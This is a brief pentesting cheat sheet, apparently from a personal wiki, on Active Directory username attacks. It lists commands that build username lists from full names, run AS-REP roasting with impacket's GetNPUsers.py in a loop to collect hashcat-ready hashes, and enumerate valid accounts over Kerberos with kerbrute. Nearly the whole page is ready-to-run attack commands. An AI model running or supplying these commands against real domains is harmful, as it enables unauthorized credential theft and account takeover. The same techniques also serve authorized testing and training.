---
title: With_Usernames
permalink: /Windows/Exploiting_usernames
---


## Create username login based from a list of names##
````./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt```

## To extract hashed via ASProasting given a set of usernames  
```while read p; do python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py $DC/"$p" -request -format hashcat -no-pass -dc-ip $IP_BOX >> hash.txt; done < usernames.txt```


### Test first with  
```/usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -usersfile users.list```

To test vor validity of usernames on port 88, requiring DC  
```kerbrut userenum --dc $BOX -d $DC usernames.txt```
